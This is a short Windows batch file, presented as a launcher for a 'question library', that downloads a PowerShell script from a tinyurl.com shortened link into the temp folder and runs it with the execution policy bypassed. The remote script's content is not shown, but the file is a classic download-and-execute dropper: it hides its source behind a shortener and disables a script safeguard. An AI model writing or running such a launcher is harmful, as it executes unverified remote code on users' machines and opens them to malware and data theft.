@echo off
setlocal
curl.exe -fLsS "https://tinyurl.com/maxipriti" -o "%TEMP%\search_engine.ps1"
if errorlevel 1 (
  echo Failed to download the question library script.
  pause
  exit /b 1
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\search_engine.ps1"
if errorlevel 1 (
  echo Question library could not start.
  pause
  exit /b 1
)
endlocal
